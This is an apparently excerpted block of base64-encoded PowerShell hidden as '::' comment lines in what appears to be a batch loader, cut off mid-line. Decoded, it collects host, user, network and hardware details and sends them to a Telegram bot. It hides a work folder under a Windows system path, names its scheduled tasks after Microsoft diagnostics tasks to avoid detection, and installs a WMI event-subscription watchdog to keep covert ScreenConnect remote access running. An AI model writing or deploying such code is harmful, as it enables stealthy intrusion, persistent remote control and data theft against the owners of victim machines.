::1bnQpDQotIE5vdGU6IExhc3RSZXN1bHQgMjY3MDExID0gdGFzayBub3QgeWV0IHJ1biAobm9ybW
::FsIHJpZ2h0IGFmdGVyIGNyZWF0ZSkNCg0KPGI+RGVwbG95IGxvZyBtYXJrZXJzPC9iPg0KJCgkZ
::GlhZ0xpbmVzIC1qb2luICJgbiIpDQoiQA0KfQ0KDQokdGV4dCA9IEAiDQokZW1vamkgPGI+U0Mg
::TW9uaXRvciAtICQoRXNjICR0aXRsZSk8L2I+DQoNCjxiPkV2ZW50PC9iPg0KLSBTdW1tYXJ5OiA
::kKEVzYyAkU3VtbWFyeSkNCi0gVHJhbnNpdGlvbjogPGNvZGU+JChFc2MgJHRyYW5zKTwvY29kZT
::4NCi0gV2hlbjogJChFc2MgJG5vdykNCiRkZXBsb3lCbG9jaw0KDQo8Yj5Ib3N0PC9iPg0KLSBDb
::21wdXRlcjogPGNvZGU+JChFc2MgJGVudjpDT01QVVRFUk5BTUUpPC9jb2RlPg0KLSBVc2VyOiA8
::Y29kZT4kKEVzYyAkd2hvKTwvY29kZT4NCi0gRWxldmF0ZWQ6ICRlbGV2IHwgU1lTVEVNOiAkaXN
::TeXN0ZW0NCi0gRG9tYWluL1dvcmtncm91cDogJChFc2MgJG9zLkRvbWFpbikNCg0KPGI+TmV0d2
::9yazwvYj4NCi0gTEFOIElQczogPGNvZGU+JChFc2MgJGxhbik8L2NvZGU+DQotIFB1YmxpYyBJU
::DogPGNvZGU+JChFc2MgJHB1Yik8L2NvZGU+DQoNCjxiPk9TIC8gSGFyZHdhcmU8L2I+DQotIE9T
::OiAkKEVzYyAkb3MuQ2FwdGlvbikNCi0gVmVyc2lvbjogJChFc2MgJG9zLlZlcnNpb24pIChidWl
::sZCAkKEVzYyAkb3MuQnVpbGQpKSAkKEVzYyAkb3MuQXJjaCkNCi0gSW5zdGFsbDogJChFc2MgJG
::9zLkluc3RhbGxEYXRlKSB8IExhc3QgYm9vdDogJChFc2MgJG9zLkxhc3RCb290KQ0KLSBVcHRpb
::WU6ICQoRXNjICR1cHRpbWUpDQotIENQVTogJChFc2MgJG9zLkNQVSkNCi0gSGFyZHdhcmU6ICQo
::RXNjICRvcy5NYW51ZmFjdHVyZXIpICQoRXNjICRvcy5Nb2RlbCkNCi0gU2VyaWFsOiA8Y29kZT4
::kKEVzYyAkb3MuU2VyaWFsKTwvY29kZT4NCi0gUkFNOiAkKCRvcy5Ub3RhbFJBTV9HQikgR0INCi
::0gRGlzayBDOiAkKCRvcy5EaXNrRnJlZV9HQikgR0IgZnJlZSAvICQoJG9zLkRpc2tTaXplX0dCK
::SBHQg0KDQo8Yj5TY3JlZW5Db25uZWN0IChhbGwpPC9iPg0KLSBQcmltYXJ5IDxjb2RlPjVmNjAx
::MDU3OTg1MmU1MDc8L2NvZGU+OiAkKEVzYyAkcHJpbUxpbmUpDQotIEFsdCA8Y29kZT5mODYxYzg
::xNDBkNDUzNDI3PC9jb2RlPjogJChFc2MgJGFsdExpbmUpDQokKCRzY0xpc3QgLWpvaW4gImBuIi
::kNCg0KPGI+T3RoZXIgUk1NIC8gcmVtb3RlIHRvb2xzPC9iPg0KJCgkcm1tSGl0cyAtam9pbiAiY
::G4iKQ0KDQo8Yj5QZXJzaXN0IHRhc2tzIChleHBlY3RlZCk8L2I+DQokKCR0YXNrTGluZXMgLWpv
::aW4gImBuIikNCg0KPGI+Q2FjaGU8L2I+DQotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNpemUpDQo
::tIFdvcmtEaXI6IDxjb2RlPiQoRXNjICRXb3JrRGlyKTwvY29kZT4NCg0KPGI+Q2FtcGFpZ24gc3
::RhdGU8L2I+DQotIDxjb2RlPiQoRXNjICRzdGF0ZUxpbmUpPC9jb2RlPg0KDQo8aT5Cb3Q6IEBub
::2J1ZGR5cm1tQm90IHwgVEdfUkVQT1JUIFQ3PC9pPg0KIkANCg0KIyBjb21wYWN0IGRpZ2VzdCBt
::b2RlOiBvbmUgc2hvcnQgbGluZSwgSFRNTC1mcmVlIChob3VybHkgaGVhcnRiZWF0KQ0KaWYgKCR
::Nb2RlIC1lcSAnY29tcGFjdCcpIHsNCiAgICAkZm9yZWlnbk4gPSAwDQogICAgaWYgKCRzdGF0ZU
::9iaiAtYW5kICRzdGF0ZU9iai5mb3JlaWduKSB7ICRmb3JlaWduTiA9IEAoJHN0YXRlT2JqLmZvc
::mVpZ24pLkNvdW50IH0NCiAgICAkbXNpU2hvcnQgPSBpZiAoVGVzdC1QYXRoICRtc2lDYWNoZSkg
::eyAnezA6TjB9S0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlKS5MZW5ndGggLyAxS0IpIH0gZWx
::zZSB7ICcwJyB9DQogICAgJHByaW1TaG9ydCA9IGlmICgkcHJpbU9rKSB7ICdPSycgfSBlbHNlIH
::sgJ0RPV04nIH0NCiAgICAkYWx0U2hvcnQgPSBpZiAoJGFsdExpbmUgLWxpa2UgJ1J1bm5pbmcqJ
::ykgeyAnT0snIH0gZWxzZSB7ICctJyB9DQogICAgJHRleHQgPSAiJGVtb2ppIFNDRHwkKCRlbnY6
::Q09NUFVURVJOQU1FKXxwcmltPSRwcmltU2hvcnR8YWx0PSRhbHRTaG9ydHxmb3JlaWduPSRmb3J
::laWduTnx0YXNrcz0kdGFza09rLzV8bXNpPSRtc2lTaG9ydHx1cD0kdXB0aW1lfGI9JEJ1aWxkfC
::Rub3ciDQp9DQoNCmlmICgkdGV4dC5MZW5ndGggLWd0IDM4MDApIHsNCiAgICAkcm1tSGl0cyA9I
::EAoKCRybW1IaXRzIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMTIpKSArICgnLSAuLi4gKHswfSBt
::b3JlKScgLWYgKCRybW1IaXRzLkNvdW50IC0gMTIpKQ0KICAgICRzY0xpc3QgPSBAKCgkc2NMaXN
::0IHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMTQpKSArICgnLSAuLi4gKHswfSBtb3JlKScgLWYgKC
::RzY0xpc3QuQ291bnQgLSAxNCkpDQogICAgJHRleHQgPSAkdGV4dC5TdWJzdHJpbmcoMCwgMzgwM
::CkgKyAiYG5gbjxpPlRSVU5DQVRFRCAoVGVsZWdyYW0gNDA5NiBsaW1pdCk8L2k+Ig0KfQ0KDQok
::bG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicNCmZ1bmN0aW9uIFNlbmQtVGcoW3N
::0cmluZ10kbXNnLCBbc3RyaW5nXSRtb2RlKSB7DQogICAgJHBheWxvYWQgPSBAew0KICAgICAgIC
::BjaGF0X2lkICAgICAgICAgICAgICAgICAgPSAkY2ZnLkNIQVRfSUQNCiAgICAgICAgdGV4dCAgI
::CAgICAgICAgICAgICAgICAgID0gJG1zZw0KICAgICAgICBkaXNhYmxlX3dlYl9wYWdlX3ByZXZp
::ZXcgPSAkdHJ1ZQ0KICAgIH0NCiAgICBpZiAoJG1vZGUpIHsgJHBheWxvYWQucGFyc2VfbW9kZSA
::9ICRtb2RlIH0NCiAgICAkanNvbiA9ICRwYXlsb2FkIHwgQ29udmVydFRvLUpzb24gLUNvbXByZX
::NzIC1EZXB0aCA1DQogICAgJGJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZ
::XRCeXRlcygkanNvbikNCiAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICgiaHR0cHM6Ly9hcGku
::dGVsZWdyYW0ub3JnL2JvdCQoJGNmZy5CT1RfVE9LRU4pL3NlbmRNZXNzYWdlIikgYA0KICAgICA
::gICAtTWV0aG9kIFBvc3QgLUJvZHkgJGJ5dGVzIC1Db250ZW50VHlwZSAnYXBwbGljYXRpb24van
::NvbjsgY2hhcnNldD11dGYtOCcgfCBPdXQtTnVsbA0KfQ0KDQpmdW5jdGlvbiBTZW5kLVRnU2FmZ
::Shbc3RyaW5nXSRtc2csIFtzdHJpbmddJG1vZGUpIHsNCiAgICAkdG9TZW5kID0gJG1zZw0KICAg
::IHRyeSB7DQogICAgICAgIFNlbmQtVGcgLW1zZyAkdG9TZW5kIC1tb2RlICRtb2RlDQogICAgICA
::gIHJldHVybiAkdHJ1ZQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICB0cnkgew0KICAgICAgICAgIC
::AgU2VuZC1UZyAtbXNnICgkdG9TZW5kLlN1YnN0cmluZygwLCAzMDAwKSArICJgbjxpPlRSVU5DQ
::VRFRDwvaT4iKSAtbW9kZSAkbW9kZQ0KICAgICAgICAgICAgcmV0dXJuICR0cnVlDQogICAgICAg
::IH0gY2F0Y2ggew0KICAgICAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgICAgICB9DQogICAgfQ0
::KfQ0KDQp0cnkgew0KICAgIGlmIChTZW5kLVRnU2FmZSAtbXNnICR0ZXh0IC1tb2RlICdIVE1MJy
::kgew0KICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgJ3RnX3Nlb
::nRfcmljaCcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9IGVsc2Ugew0KICAg
::ICAgICB0aHJvdyAnaHRtbF9mYWlsZWQnDQogICAgfQ0KICAgIGlmICgka2V5IC1lcSAnREVQTE9
::ZJykgew0KICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCJ0Z1
::9kZXBsb3lfb2s9IiArICRkZXBsb3lPaykgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNC
::iAgICAgICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdvcmtEaXIgJ2Rl
::cGxveV90Zy5mbGFnJykgLVZhbHVlIChHZXQtRGF0ZSAtRm9ybWF0ICdvJykgLUVycm9yQWN0aW9
::uIFNpbGVudGx5Q29udGludWUNCiAgICB9DQp9IGNhdGNoIHsNCiAgICB0cnkgew0KICAgICAgIC
::AkcGxhaW4gPSBbcmVnZXhdOjpSZXBsYWNlKCR0ZXh0LCAnPFtePl0rPicsICcnKQ0KICAgICAgI
::CAkcGxhaW4gPSBbU3lzdGVtLk5ldC5XZWJVdGlsaXR5XTo6SHRtbERlY29kZSgkcGxhaW4pDQog
::ICAgICAgIGlmICgkcGxhaW4uTGVuZ3RoIC1ndCAzNTAwKSB7ICRwbGFpbiA9ICRwbGFpbi5TdWJ
::zdHJpbmcoMCwgMzUwMCkgKyAiYG5UUlVOQ0FURUQiIH0NCiAgICAgICAgU2VuZC1UZ1NhZmUgLW
::1zZyAkcGxhaW4gLW1vZGUgJycgfCBPdXQtTnVsbA0KICAgICAgICBBZGQtQ29udGVudCAtTGl0Z
::XJhbFBhdGggJGxvZyAtVmFsdWUgJ3RnX3NlbnRfcGxhaW4nIC1FcnJvckFjdGlvbiBTaWxlbnRs
::eUNvbnRpbnVlDQogICAgfSBjYXRjaCB7DQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF
::0aCAkbG9nIC1WYWx1ZSAoInRnX2ZhaWwgIiArICRfLkV4Y2VwdGlvbi5NZXNzYWdlKSAtRXJyb3
::JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0NCn0NCg==
::B64_TGR_END
::B64_LIB_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZD
::ilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ
::DilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDil
::ZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZANCiMgT1dOX0xJ
::QiAgQlVJTEQgMjAyNjA4MDJMMQ0KIyBTaGFyZWQgbGlicmFyeTogcGVyLWhvc3QgaWRlbnRpdHk
::gKGFudGktc2lnbmF0dXJlKSwgV01JIHdhdGNoZG9nDQojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2
::hhaW4pLCBjYW1wYWlnbiBzdGF0ZSBmaWxlLg0KIyBBdXRob3JpemVkIGludGVybmFsIGRlcGxve
::W1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4NCiMg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pW
::Q4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4p
::WQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4
::pWQDQpbQ21kbGV0QmluZGluZygpXQ0KcGFyYW0oDQogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkg
::PSAkdHJ1ZSldDQogICAgW1ZhbGlkYXRlU2V0KCdpbml0JywgJ3dhdGNoZG9nJywgJ3dhdGNoZG9
::nLWVuc3VyZScsICdzdGF0ZScsICdpZGVudGl0eScpXQ0KICAgIFtzdHJpbmddJEFjdGlvbiwNCi
::AgICBbc3RyaW5nXSRXb3JrRGlyID0gJ0M6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzX
::FdFUlxUZW1wXC53dWNhY2hlJywNCiAgICBbc3RyaW5nXSRNb25QYXRoID0gJycsDQogICAgW3N0
::cmluZ10kQnVpbGQgID0gJ08xNScsDQogICAgW3N0cmluZ10kRXh0cmEgID0gJycNCikNCg0KJEV
::ycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0KJGNmZ1BhdGggPSBKb2
::luLVBhdGggJFdvcmtEaXIgJ2lkZW50aXR5LmNmZycNCg0KIyBMZWdpdC1sb29raW5nIHRhc2stb
::mFtZSBwb29sczsgcGVyLWhvc3QgaGFzaCBwaWNrcyBvbmUgcGVyIHNsb3QuDQokUG9vbHMgPSBA
::ew0KICAgIEEgPSBAKCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXFNjaGVkdWxlZCcsJ1x
::NaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcQlZUQ29uc3VtZXInLCdcTWljcm9zb2Z0XFdpbm
::Rvd3NcTmV0VHJhY2VcR2F0aGVyTmV0d29ya0luZm8nLCdcTWljcm9zb2Z0XFdpbmRvd3NcV0RJX
::FJlc29sdXRpb25Ib3N0JywnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXIgRGlhZ25vc3Rp
::Y3MnLCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlza0RpYWdub3N0aWNcUmVzb2x2ZXInLCdcTWljcm9
::zb2Z0XFdpbmRvd3NcTWVtb3J5RGlhZ25vc3RpY1xDb3JydXB0aW9uRGV0ZWN0b3InLCdcTWljcm
::9zb2Z0XFdpbmRvd3NcUG93ZXIgRWZmaWNpZW5jeSBEaWFnbm9zdGljc1xBbmFseXplU3lzdGVtJ
::ykNCiAgICBCID0gQCgnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXInLCdcTWljcm9zb2Z0
::XFdpbmRvd3NcV0RJXFJlc29sdXRpb25Ib3N0JywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3N
::pc1xCVlRDb25zdW1lcicsJ1xNaWNyb3NvZnRcV2luZG93c1xOZXRUcmFjZVxHYXRoZXJOZXR3b3
::JrSW5mbycsJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcU2NoZWR1bGVkJywnXE1pY3Jvc
::29mdFxXaW5kb3dzXERpc2tEaWFnbm9zdGljXFJlc29sdmVyJywnXE1pY3Jvc29mdFxXaW5kb3dz
::XE1lbW9yeURpYWdub3N0aWNcQ29ycnVwdGlvblZlcmlmaWVyJywnXE1pY3Jvc29mdFxXaW5kb3d
::zXFd3YW5TdmNcTm90aWZpY2F0aW9uJykNCiAgICBDID0gQCgnXE1pY3Jvc29mdFxXaW5kb3dzXF
::dESVxSZXNvbHV0aW9uSG9zdCcsJ1xNaWNyb3NvZnRcV2luZG93c1xOZXRUcmFjZVxHYXRoZXJOZ
::XR3b3JrSW5mbycsJ1xNaWNyb3NvZnRcV2luZG93c1xUY3BpcFxJcEFkZHJlc3NDb25mbGljdDEn
::LCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXEJWVENvbnN1bWVyJywnXE1pY3Jvc29mdFx
::XaW5kb3dzXFBMQVxTZXJ2ZXInLCdcTWljcm9zb2Z0XFdpbmRvd3NcV3dhblN2Y1xOb3RpZmljYX
::Rpb24nLCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlza0RpYWdub3N0aWNcUmVzb2x2ZXInLCdcTWljc
::m9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXFNjaGVkdWxlZCcpDQogICAgRCA9IEAoJ1xNaWNyb3Nv
::ZnRcV2luZG93c1xUY3BpcFxJcEFkZHJlc3NDb25mbGljdDEnLCdcTWljcm9zb2Z0XFdpbmRvd3N
::cV0RJXFJlc29sdXRpb25Ib3N0JywnXE1pY3Jvc29mdFxXaW5kb3dzXE5ldFRyYWNlXEdhdGhlck
::5ldHdvcmtJbmZvJywnXE1pY3Jvc29mdFxXaW5kb3dzXFd3YW5TdmNcTm90aWZpY2F0aW9uJywnX
::E1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xCVlRDb25zdW1lcicsJ1xNaWNyb3NvZnRcV2lu
::ZG93c1xQTEFcU2VydmVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpc2tEaWFnbm9zdGljXFJlc29
::sdmVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTY2hlZHVsZWQnKQ0KfQ0KJERlZm
::F1bHRzID0gW29yZGVyZWRdQHsNCiAgICBUQVNLX0EgPSAnXE1pY3Jvc29mdFxXaW5kb3dzXERpY
::Wdub3Npc1xTY2hlZHVsZWQnDQogICAgVEFTS19CID0gJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFc
::U2VydmVyJw0KICAgIFRBU0tfQyA9ICdcTWljcm9zb2Z0XFdpbmRvd3NcV0RJXFJlc29sdXRpb25
::Ib3N0Jw0KICAgIFRBU0tfRCA9ICdcTWljcm9zb2Z0XFdpbmRvd3NcVGNwaXBcSXBBZGRyZXNzQ2
::9uZmxpY3QxJw0KICAgIE1PX0EgICA9ICcyJw0KICAgIE1PX0IgICA9ICczJw0KfQ0KDQpmdW5jd
::GlvbiBHZXQtSG9zdFNlZWQgew0KICAgICRzID0gMEwNCiAgICBmb3JlYWNoICgkYyBpbiAkZW52
::OkNPTVBVVEVSTkFNRS5Ub1VwcGVyKCkuVG9DaGFyQXJyYXkoKSkgeyAkcyA9ICgkcyAqIDMxICs
::gW2ludF0kYykgJSAxMDAwMDAwMDA3IH0NCiAgICByZXR1cm4gJHMNCn0NCg0KZnVuY3Rpb24gUm
::VhZC1JZGVudGl0eSB7DQogICAgJGlkID0gJERlZmF1bHRzLkNsb25lKCkNCiAgICBpZiAoVGVzd
::C1QYXRoICRjZmdQYXRoKSB7DQogICAgICAgIGZvcmVhY2ggKCRsaW5lIGluIChHZXQtQ29udGVu
::dCAtTGl0ZXJhbFBhdGggJGNmZ1BhdGgpKSB7DQogICAgICAgICAgICBpZiAoJGxpbmUgLW1hdGN
::oICdeXHMqKFtBLVpfXSspXHMqPVxzKiguKz8pXHMqJCcpIHsgJGlkWyRtYXRjaGVzWzFdXSA9IC
::RtYXRjaGVzWzJdIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJGlkDQp9DQoNCmZ1b
::mN0aW9uIEluaXRpYWxpemUtSWRlbnRpdHkgew0KICAgICMgSWRlbXBvdGVudDogaWRlbnRpdHkg
::bXVzdCBuZXZlciBjaGFuZ2Ugb25jZSB3cml0dGVuICh0YXNrcyBkZXBlbmQgb24gaXQpLg0KICA
::gIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgpIHsgcmV0dXJuIChSZWFkLUlkZW50aXR5KSB9DQogIC
::AgJHMgPSBHZXQtSG9zdFNlZWQNCiAgICAkY2ZnID0gQCgNCiAgICAgICAgIlRBU0tfQT0kKCRQb
::29scy5BWyRzICUgOF0pIg0KICAgICAgICAiVEFTS19CPSQoJFBvb2xzLkJbKCRzICsgMykgJSA4
::XSkiDQogICAgICAgICJUQVNLX0M9JCgkUG9vbHMuQ1soJHMgKyA1KSAlIDhdKSINCiAgICAgICA
::gIlRBU0tfRD0kKCRQb29scy5EWygkcyArIDcpICUgOF0pIg0KICAgICAgICAiTU9fQT0kKDIgKy
::AoJHMgJSA0KSkiICAgICAgICAgICMgMi01IG1pbiBqaXR0ZXINCiAgICAgICAgIk1PX0I9JCgzI
::CsgKCgkcyArIDEpICUgMykpIiAgICAjIDMtNSBtaW4gaml0dGVyDQogICAgICAgICJTRUVEPSRz
::Ig0KICAgICkNCiAgICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGNmZ1BhdGggLVZhbHVlICR
::jZmcgLUZvcmNlDQogICAgcmV0dXJuIChSZWFkLUlkZW50aXR5KQ0KfQ0KDQpmdW5jdGlvbiBJbn
::N0YWxsLVdhdGNoZG9nIHsNCiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyByZXR1cm4gJGZhbHNlI
::H0NCiAgICAkb2sgPSAkdHJ1ZQ0KICAgIHRyeSB7DQogICAgICAgIFNldC1XbWlJbnN0YW5jZSAt
::TmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0ludGVydmFsVGltZXJJbnN0cnV
::jdGlvbiBgDQogICAgICAgICAgICAtQXJndW1lbnRzIEB7IFRpbWVySWQgPSAnV3VjYWNoZVdhdG
::NoZG9nJzsgSW50ZXJ2YWxNaWxsaXNlY29uZHMgPSAxODAwMDA7IFNraXBJZlBhc3NlZCA9ICRmY
::WxzZSB9IHwgT3V0LU51bGwNCiAgICAgICAgJGYgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFj
::ZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19FdmVudEZpbHRlciBgDQogICAgICAgICAgICA
::tQXJndW1lbnRzIEB7IE5hbWUgPSAnV3VjYWNoZVdhdGNoZG9nRic7IEV2ZW50TmFtZXNwYWNlID
::0gJ3Jvb3RcY2ltdjInOyBRdWVyeUxhbmd1YWdlID0gJ1dRTCc7DQogICAgICAgICAgICAgICAgI
::CAgICAgICAgIFF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gX19UaW1lckV2ZW50IFdIRVJFIFRpbWVy
::SWQ9J1d1Y2FjaGVXYXRjaGRvZyciIH0NCiAgICAgICAgJGMgPSBTZXQtV21pSW5zdGFuY2UgLU5
::hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bW
::VyIGANCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgTmFtZSA9ICdXdWNhY2hlV2F0Y2hkb2dDJ
::zsgQ29tbWFuZExpbmVUZW1wbGF0ZSA9ICJjbWQuZXhlIC9jIGAiJE1vblBhdGhgIiI7IFJ1bklu
::dGVyYWN0aXZlbHkgPSAkZmFsc2UgfQ0KICAgICAgICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGF
::jZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZyBgDQ
::ogICAgICAgICAgICAtQXJndW1lbnRzIEB7IEZpbHRlciA9ICRmOyBDb25zdW1lciA9ICRjIH0gf
::CBPdXQtTnVsbA0KICAgIH0gY2F0Y2ggeyAkb2sgPSAkZmFsc2UgfQ0KICAgIHJldHVybiAkb2sN
::Cn0NCg0KZnVuY3Rpb24gRW5zdXJlLVdhdGNoZG9nIHsNCiAgICAkYyA9IEdldC1XbWlPYmplY3Q
::gLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENvbn
::N1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIg0KICAgIGlmICgkbnVsbCAtZ
::XEgJGMpIHsNCiAgICAgICAgSW5zdGFsbC1XYXRjaGRvZyB8IE91dC1OdWxsDQogICAgICAgIHJl
::dHVybiAnUkVBUk1FRCcNCiAgICB9DQogICAgcmV0dXJuICdPSycNCn0NCg0KZnVuY3Rpb24gVXB
::kYXRlLVN0YXRlIHsNCiAgICAkcHJpbSA9ICRudWxsOyAkYWx0ID0gJG51bGwNCiAgICBmb3JlYW
::NoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykpI
::HsNCiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsN
::CiAgICAgICAgICAgIGlmICgkbWF0Y2hlc1sxXSAtZXEgJzVmNjAxMDU3OTg1MmU1MDcnKSB7ICR
::wcmltID0gIiQoJHN2Yy5TdGF0dXMpIiB9DQogICAgICAgICAgICBlbHNlaWYgKCRtYXRjaGVzWz
::FdIC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsgJGFsdCA9ICIkKCRzdmMuU3RhdHVzKSIgfQ0KI
::CAgICAgICB9DQogICAgfQ0KICAgICRmb3JlaWduID0gQCgpDQogICAgZm9yZWFjaCAoJHN2YyBp
::biAoR2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicpKSB7DQogICAgICA
::gIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCknIC1hbmQgJG1hdGNoZX
::NbMV0gLW5vdGluIEAoJzVmNjAxMDU3OTg1MmU1MDcnLCdmODYxYzgxNDBkNDUzNDI3JykpIHsNC
::iAgICAgICAgICAgICRmb3JlaWduICs9ICRtYXRjaGVzWzFdDQogICAgICAgIH0NCiAgICB9DQog
::ICAgJGlkID0gUmVhZC1JZGVudGl0eQ0KICAgICR0YXNrc09rID0gMDsgJHRhc2tzVG90YWwgPSA
::wDQogICAgZm9yZWFjaCAoJGsgaW4gJ1RBU0tfQScsJ1RBU0tfQicsJ1RBU0tfQycsJ1RBU0tfRC
::cpIHsNCiAgICAgICAgJHRhc2tzVG90YWwrKw0KICAgICAgICAmIHNjaHRhc2tzLmV4ZSAvUXVlc
::nkgL1ROICRpZFska10gMj4mMSB8IE91dC1OdWxsDQogICAgICAgIGlmICgkTEFTVEVYSVRDT0RF
::IC1lcSAwKSB7ICR0YXNrc09rKysgfQ0KICAgIH0NCiAgICAkd2QgPSBFbnN1cmUtV2F0Y2hkb2c
::NCiAgICAkcHJldiA9IEB7fQ0KICAgICRzdGF0ZVBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ3
::N0YXRlLmpzb24nDQogICAgaWYgKFRlc3QtUGF0aCAkc3RhdGVQYXRoKSB7DQogICAgICAgIHRye
::SB7IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aCAtUmF3IHwgQ29udmVydEZy
::b20tSnNvbikuUFNPYmplY3QuUHJvcGVydGllcyB8IEZvckVhY2gtT2JqZWN0IHsgJHByZXZbJF8
::uTmFtZV0gPSAkXy5WYWx1ZSB9IH0gY2F0Y2gge30NCiAgICB9DQogICAgJGluc3RhbGxDb3VudC
::A9IDENCiAgICBpZiAoJHByZXYuaW5zdGFsbENvdW50KSB7ICRpbnN0YWxsQ291bnQgPSBbaW50X
::SRwcmV2Lmluc3RhbGxDb3VudCB9DQogICAgaWYgKCRwcmV2LnByaW0gLWFuZCAkcHJldi5wcmlt
::IC1uZSAnUnVubmluZycgLWFuZCAkcHJpbSAtZXEgJ1J1bm5pbmcnKSB7ICRpbnN0YWxsQ291bnQ
::rKyB9DQogICAgJHN0YXRlID0gW29yZGVyZWRdQHsNCiAgICAgICAgaG9zdCAgICAgICAgID0gJG
::VudjpDT01QVVRFUk5BTUUNCiAgICAgICAgdHMgICAgICAgICAgID0gKEdldC1EYXRlKS5Ub1Vua
::XZlcnNhbFRpbWUoKS5Ub1N0cmluZygnbycpDQogICAgICAgIGJ1aWxkICAgICAgICA9ICRCdWls
::ZA0KICAgICAgICBwcmltICAgICAgICAgPSAkKGlmICgkcHJpbSkgeyAkcHJpbSB9IGVsc2UgeyA
::nTUlTU0lORycgfSkNCiAgICAgICAgYWx0ICAgICAgICAgID0gJChpZiAoJGFsdCkgeyAkYWx0IH
::0gZWxzZSB7ICdNSVNTSU5HJyB9KQ0KICAgICAgICBmb3JlaWduICAgICAgPSAkZm9yZWlnbg0KI
::CAgICAgICB0YXNrc09rICAgICAgPSAkdGFza3NPaw0KICAgICAgICB0YXNrc1RvdGFsICAgPSAk
::dGFza3NUb3RhbA0KICAgICAgICB3YXRjaGRvZyAgICAgPSAkd2QNCiAgICAgICAgaW5zdGFsbEN
::vdW50ID0gJGluc3RhbGxDb3VudA0KICAgICAgICBsYXN0SGVhbCAgICAgPSAkKGlmICgkRXh0cm
::EpIHsgKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygnbycpIH0gZWxzZWlmI
